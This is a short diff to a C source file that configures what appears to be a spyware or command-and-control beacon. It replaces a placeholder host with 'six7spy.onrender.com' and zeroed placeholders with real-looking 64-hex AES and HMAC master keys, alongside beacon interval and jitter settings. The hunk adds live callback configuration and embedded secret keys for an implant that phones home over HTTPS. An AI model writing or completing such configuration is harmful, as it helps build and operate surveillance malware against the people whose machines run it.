@@ -37,14 +37,14 @@
  * Keys must be exactly 64 lowercase hex chars matching AES_KEY / HMAC_KEY
  * environment variables set on the server.
  */
-#define HOST        "FILL_HOST_HERE"          /* e.g. yourapp.railway.app */
+#define HOST        "six7spy.onrender.com"
 #define PORT        443
 #define USE_TLS     1                          /* 1 = HTTPS, 0 = plain HTTP */
 
 static const char MASTER_AES_HEX[65]  =
-    "0000000000000000000000000000000000000000000000000000000000000000";
+    "d634fc26c4bdcdc9cc8cf85dee10c7b3721553977cf68cec96078f094671b1b6";
 static const char MASTER_HMAC_HEX[65] =
-    "0000000000000000000000000000000000000000000000000000000000000000";
+    "3eb8b23d5938e78c73f82631a6e697eaeff88d0b7f2cbfa7cc69455d5553d054";
 
 #define BEACON_MS        5000
 #define BEACON_JITTER_MS 2000
